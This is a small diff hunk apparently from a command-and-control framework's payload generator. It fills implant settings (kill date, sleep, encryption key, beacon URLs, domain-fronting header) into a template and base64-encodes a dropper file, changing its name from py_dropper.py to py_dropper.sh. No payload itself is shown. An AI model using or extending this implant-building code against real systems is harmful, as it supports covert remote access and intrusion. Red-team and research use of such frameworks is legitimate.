@@ -39,7 +39,7 @@ KILLDATE1665%s5661ETADLLIK
 SLEEP98001%s10089PEELS
 NEWKEY8839394%s4939388YEKWEN
 IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Key, self.AllBeaconImages)
-    with open("%spy_dropper.py" % (PayloadsDirectory), 'rb') as f:
+    with open("%spy_dropper.sh" % (PayloadsDirectory), 'rb') as f:
         self.PythonImplant = base64.b64encode(f.read())
     py_implant_core = open("%s/Implant-Core.py" % FilesDirectory, 'r').read()
     self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.UserAgent)
